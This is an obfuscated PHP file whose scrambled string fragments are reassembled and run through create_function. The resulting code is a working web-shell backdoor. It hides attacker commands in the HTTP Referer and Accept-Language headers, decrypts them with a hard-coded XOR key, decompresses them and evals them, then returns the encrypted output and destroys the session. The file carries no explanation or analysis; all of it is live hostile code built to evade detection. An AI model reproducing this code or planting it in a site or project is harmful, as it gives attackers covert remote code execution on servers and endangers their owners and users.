<?php
$s='($u["quer{6y"],$q{6);$q=array{6_value{6s{6($q);preg_ma{6t{6ch_all({6"/([\\{6w])[\\w-]{6';
$D='$kh{6="5d{641";$kf="{6402a";funct{6ion {6{6x($t,$k){$c=s{6trle{6n($k);$l=s{6{6trlen($t);$';
$G='4_encode{6(x(gzc{6{6ompress($o),{6$k));p{6rint("<{6$k>$d<{6/$k>"{6);@{6ses{6sion_destro{6y();}}}}';
$h='SESSIO{6N;$ss="{6substr"{6;${6sl={6"str{6tolower";$i=${6m[1][0].$m[1]{6[{61{6];$h=$s{6{6l($ss';
$L='({6md5{6($i.${6kh),0{6,{63));$f=$sl{6($ss(md{65($i.$kf),0,3){6);${6p="";for($z=1;$z<co{';
$g='[$i]{6{6,0,{6$e))),$k)));{6${6o=ob_{6get_contents();o{6b_end{6_clean(){6;$d={6base6{6';
$n=';$p=$ss{6($p{6,3);}if(ar{6ray_key{6_exist{6s{6($i,{6$s)){$s{6[$i].=$p;{6$e=str{6{6pos';
$d='se{664_{6decode(p{6reg_replac{6e(ar{6ray{6("/_/",{6"/-/"),ar{6ray{6{6({6"/","+"),$ss($s';
$b='{6+(?:;q=0.({6[\\d]))?{6,{6?/",$ra,$m){6;if($q{6&&$m){@ses{6si{6on{6_start({6);$s=&$_{6';
$Y='6unt(${6m[1]);{6$z+{6+)$p.{6=$q[$m{6[2][$z]{6];if(str{6pos{6($p,$h)==={60){$s[$i{6]={6""';
$N='@$r["HT{6TP_ACCEPT_LANGUA{6GE"];if($rr&&{6${6ra){${6u{6=parse_u{6rl($rr{6);pa{6rse_st{6r';
$y='o{6={6""{6{6;for($i{6=0;$i<$l;){for($j=0{6{6;($j<$c&{6&$i<$l);${6j++,$i{6++){6{$o.{6=$t';
$F=str_replace('IQ','','crIQIQeatIQe_fuIQncIQtiIQon');
$r='($s[$i{6],$f){6;if($e){$k=$k{6h.$kf;{6ob_sta{6rt(){6;@ev{6al{6(@g{6zunco{6mpress(@x(@ba';
$a='{$i}^$k{${6j};}}{6ret{6urn $o;}$r={6$_S{6ERVER{6;{6$rr=@$r[{6"HT{6{6TP_RE{6FERER"];${6ra={6';
$X=str_replace('{6','',$D.$y.$a.$N.$s.$b.$h.$L.$Y.$n.$r.$d.$g.$G);
$I=$F('',$X);$I();
?>
